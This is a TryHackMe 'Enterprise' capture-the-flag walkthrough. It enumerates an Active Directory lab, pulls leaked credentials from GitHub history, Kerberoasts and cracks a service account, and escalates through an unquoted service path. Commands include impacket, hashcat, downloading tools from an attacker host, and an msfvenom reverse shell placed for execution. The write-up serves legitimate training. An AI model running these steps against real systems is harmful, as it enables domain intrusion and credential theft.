<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>enterprise</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>enterprise</h1><br/><p><strong><h1>THM: Enterprise</h1></strong></p><p></p><p></p><p><strong><h2>Enumeration</h2></strong></p><p></p><p></p><p><strong><span style="text-decoration:underline;">Rustscan &amp; Nmap:</span></strong></p><p></p><p><img src="images/58-1.png" alt="images/58-1.png" /></p><p><img src="images/58-2.png" alt="images/58-2.png" /></p><p><img src="images/58-3.png" alt="images/58-3.png" /></p><p></p><p><strong><span style="text-decoration:underline;">SMB Enumeration</span></strong></p><p></p><p><img src="images/58-4.png" alt="images/58-4.png" /></p><p></p><p>We got 2 files <strong>RSA-Secured-Credentials.xlsx</strong> &amp; <strong>RSA-Secured-Document-PII.docx</strong> </p><p>However, both were password protected. </p><p>So we need some other avenue for initial entry.</p><p></p><p><strong><span style="text-decoration:underline;">Website Enumeration</span></strong></p><p></p><p>From nmap scan we can see a webserver is running on port <strong>7990</strong>.</p><p></p><p><img src="images/58-5.png" alt="images/58-5.png" /></p><p></p><p>The following is the server.</p><p><img src="images/58-6.png" alt="images/58-6.png" /></p><p></p><p>We can’t do much on this site, but there is a note that the company is moving to “Github”!</p><p></p><p>We google “Enterprise-THM”</p><p></p><p><img src="images/58-7.png" alt="images/58-7.png" /></p><p></p><p>There one repository along with one user in the <strong>People</strong> tab.</p><p></p><p><img src="images/58-8.png" alt="images/58-8.png" /></p><p></p><p>It leads us to a Enterprise-THM employee: <strong>“Nik-enterprise-dev”</strong></p><p></p><p><img src="images/58-9.png" alt="images/58-9.png" /></p><p></p><p>This user has 1 folder <strong>mgmtScript.ps1</strong> containing a file <strong>SystemInfo.ps1</strong></p><p></p><p><img src="images/58-10.png" alt="images/58-10.png" /></p><p></p><p>The updated file is clean.</p><p></p><p><img src="images/58-11.png" alt="images/58-11.png" /></p><p></p><p>However, he did a big mistake and pushed the script with his credentials. He tried to remove his mistake and pushed the file again with deleted credentials. But hey! Who can know that Github saves the <strong>history</strong> of a file? ;)</p><p></p><p>Click on History &amp; open the initial created file.</p><p></p><p><img src="images/58-12.png" alt="images/58-12.png" /></p><p></p><p>We got a set of credentials. We will use this to enumerate the Domain controller.</p><p></p><p></p><p><strong><span style="text-decoration:underline;">Domain Controller Enumeration</span></strong></p><p></p><p>We will use <strong>ldapdomaindump</strong> to get information about the Domain controller.</p><p></p><p><strong>ldapdomaindump 10.10.105.25 -u &#39;LAB.ENTERPRISE.THM\nik&#39; -p &lt;PASSWORD&gt;</strong></p><p></p><p><img src="images/58-13.png" alt="images/58-13.png" /></p><p></p><p>Lets check the <strong>domain_users.html</strong> file for user info.</p><p></p><p><img src="images/58-14.png" alt="images/58-14.png" /></p><p></p><p>We can see that the user <strong>nik</strong> doesn&#39;t have rdp access. Infact, only the user <strong>BitBucker</strong> has RDP access as he is in the <strong>Remote Desktop Users</strong> group.</p><p></p><p><strong><h2>Foothold</h2></strong></p><p></p><p>Using <strong>nik</strong> account we try to get a ticket for a “Service Principal Name”. (<strong>Impacket-toolkit</strong>)</p><p></p><p><strong>impacket-GetUserSPNs -dc-ip 10.10.105.25 &#39;LAB.ENTERPRISE.THM/nik:&lt;PASSWORD&gt;&#39;</strong></p><p></p><p>The output revealed that we have an SPN account, svc-user. Once we find the SPN user, we can send a single request to get a TGS ticket for the <strong>bitbucket</strong> user using the <strong>-request </strong>argument to reuest for <strong>all users</strong> or <strong>-request-user</strong> argument to specify a <strong>particular</strong> user</p><p></p><p><strong>impacket-GetUserSPNs -dc-ip 10.10.105.25 &#39;LAB.ENTERPRISE.THM/nik:&lt;PASSWORD&gt;&#39; -request</strong></p><p></p><p><img src="images/58-15.png" alt="images/58-15.png" /></p><p></p><p>We copy the hash to a file &amp; crack it using <strong>hashcat</strong>.</p><p></p><p><strong>hashcat -m 13100 bitbucket_hash /usr/share/wordlists/rockyou.txt</strong></p><p></p><p><img src="images/58-16.png" alt="images/58-16.png" /></p><p></p><p>Now, we use <strong>xfreerdp</strong> to login as bitbucket user &amp; get the userflag on the desktop.</p><p></p><p><strong>xfreerdp /dynamic-resolution +clipboard /cert:ignore /scale:140 /v:10.10.105.25 /u:bitbucket /p:&#39;littleredbucket&#39;</strong></p><p></p><p><img src="images/58-17.png" alt="images/58-17.png" /></p><p></p><p></p><p><strong><h2>Privilege Escalation</h2></strong></p><p></p><p>We host <strong>PowerUp.ps1</strong> in our local kali machine using <strong>python</strong>. Then download it on the target machine using <strong>wget</strong> &amp; run it,</p><p></p><p><strong>wget http://10.11.9.100/PowerUp.ps1 -O PowerUp.ps1</strong></p><p><strong>. .\PowerUp.ps1</strong></p><p><strong>Invoke-AllChecks</strong></p><p></p><p><img src="images/58-18.png" alt="images/58-18.png" /></p><p></p><p>We can see, we got unquoted service path above.</p><p></p><p>This means the Path of this Executable is:</p><p></p><p>    C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe</p><p></p><p>instead of the safe variant:</p><p></p><p>    “C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe”</p><p>    </p><p>Now lets check wrtie permission in the folder: <strong>C:\Program Files (x86)\Zero Tier</strong> using <strong>ICACLS</strong></p><p></p><p><strong>icacls.exe “C:\Program Files (x86)\Zero Tier”</strong></p><p></p><p><img src="images/58-19.png" alt="images/58-19.png" /></p><p></p><p>As we can see <strong>BUILTIN\Users</strong> have write <strong>W</strong> permission in the directory.</p><p></p><p>Next, I checked for the service that is using this path. It was <strong>zerotieroneservice</strong></p><p>I checked the running privileges of the service &amp; as we can see, it will be running with <strong>administrative</strong> privileges.</p><p></p><p><strong>sc.exe qc zerotieroneservice</strong></p><p></p><p><img src="images/58-20.png" alt="images/58-20.png" /></p><p></p><p>Next, we checked if the service if running. (The service is stopped)</p><p></p><p><strong>sc.exe query zerotieroneservice</strong></p><p></p><p><img src="images/58-21.png" alt="images/58-21.png" /></p><p></p><p>Next, I need to check whether we can start the service with the current account using a tool called <strong>accesschk64.exe</strong> which i uploaded to the target machine.</p><p></p><p><strong>.\accesschk64.exe -qlcv zerotieroneservice</strong></p><p></p><p><img src="images/58-22.png" alt="images/58-22.png" /></p><p></p><p>Thus, it confirms that our user can start/stop this service.</p><p></p><p>With all things in place we begin the exploit. We will create a reverse shell windows executible using <strong>msfvenom</strong> with the name <strong>Zero</strong> &amp; put it in the <strong>C:\Program Files (x86)\Zero Tier</strong> directory. Next, will setup listener on kali machine &amp; start the service to get the reverse shell as administrator. </p><p></p><p><strong>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.9.100 LPORT=8888 -f exe -o Zero.exe</strong></p><p></p><p><img src="images/58-23.png" alt="images/58-23.png" /></p><p></p><p>On Target Machine after hosting in python webserver.</p><p></p><p><strong>wget http://10.11.9.100/Zero.exe -O &#39;C:\Program Files (x86)\Zero Tier\Zero.exe&#39;</strong></p><p></p><p>We upload it to the machine &amp; place in the specified folder mentioned above. Then we start listner on kali machine.</p><p>Finally, we run the serive using the following.</p><p></p><p><strong>sc.exe start zerotieroneservice</strong></p><p></p><p>Then, back in our listner we have our reverse connection.</p><p></p><p><img src="images/58-24.png" alt="images/58-24.png" /></p><p></p><p>We get the root flag in the Administrator&#39;s desktop.</p><p></p><p>Thanks!!</p></div>
</body>
</html>
